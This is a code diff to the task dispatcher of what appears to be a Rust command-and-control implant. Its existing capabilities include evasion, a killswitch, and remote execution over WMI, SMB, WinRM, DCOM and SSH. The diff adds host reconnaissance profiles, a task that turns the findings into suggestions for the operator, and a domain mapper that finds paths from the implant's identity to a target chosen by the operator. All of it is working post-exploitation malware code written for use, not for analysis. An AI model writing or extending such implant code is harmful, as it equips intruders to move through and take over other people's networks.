@@ -38,6 +38,9 @@ pub fn capabilities() -> Vec<&'static str> {
         "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
         "hygiene.process", "wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
         "ldap.query", "ssh.exec",
+        // The reconnaissance of the profiles, the map of the domain and the
+        // suggestions that follow from the findings.
+        "recon.suggest", "domain.map",
         // The loaders of the module ecosystem and the crypto the scripts
         // and the webassembly modules use.  A module that declares one of
         // them is only pushed to a host that has it.
@@ -394,7 +397,78 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
             shell(&cmd, timeout)
         }
         "sysinfo" => Outcome::ok(sysinfo::report().into_bytes()),
-        "recon" => Outcome::ok(recon_report().into_bytes()),
+        "recon" => {
+            // Without a profile the recon answers the way it always did:
+            // the host facts, the environment and the domain edges.  With a
+            // profile (or with the checks named one by one) the task runs
+            // the bundle and answers with the findings of the bundle.
+            let profile = args.str_or("profile", "");
+            let checks = args.str_list("checks");
+            if profile.is_empty() && checks.is_empty() {
+                Outcome::ok(recon_report().into_bytes())
+            } else {
+                match crate::profile::run(&profile, &checks) {
+                    Ok(report) => {
+                        let total = report.findings.len() as u64;
+                        Outcome::ok(report.text().into_bytes())
+                            .with("recon", report.to_value())
+                            .with("recon_total", upk::u(total))
+                    }
+                    Err(e) => Outcome::err(1, e),
+                }
+            }
+        }
+        "recon.suggest" => {
+            // The findings may travel with the task (the operator already
+            // has them) or the implant collects them now.
+            let mut findings = match args.get("findings") {
+                Some(value) => crate::profile::findings_from_value(value),
+                None => Vec::new(),
+            };
+            if findings.is_empty() {
+                let profile = args.str_or("profile", "host");
+                match crate::profile::run(&profile, &[]) {
+                    Ok(report) => findings = report.findings,
+                    Err(e) => return Outcome::err(1, e),
+                }
+            }
+            let items = crate::profile::suggest(&findings);
+            Outcome::ok(crate::profile::suggestions_text(&items).into_bytes())
+                .with("suggestions", crate::profile::suggestions_value(&items))
+        }
+        "domain.map" => {
+            // The path from the identity the implant runs as to the thing
+            // the operator wants to reach.
+            let target = args.str_or("target", "");
+            let domain = crate::domain::collect();
+            let found = crate::domain::paths(&domain, &target);
+            let paths = upk::arr(
+                found
+                    .iter()
+                    .map(|path| {
+                        upk::map(vec![
+                            ("text", upk::s(&path.text())),
+                            ("steps", upk::arr(
+                                path.steps
+                                    .iter()
+                                    .map(|step| {
+                                        upk::map(vec![
+                                            ("kind", upk::s(&step.kind)),
+                                            ("source", upk::s(&step.source)),
+                                            ("target", upk::s(&step.target)),
+                                        ])
+                                    })
+                                    .collect(),
+                            )),
+                        ])
+                    })
+                    .collect(),
+            );
+            let count = found.len() as u64;
+            Outcome::ok(crate::domain::map_report(&domain, &target).into_bytes())
+                .with("domain_map", paths)
+                .with("domain_paths", upk::u(count))
+        }
         "pwd" | "cwd" => match std::env::current_dir() {
             Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
             Err(e) => Outcome::err(1, format!("cwd: {e}")),
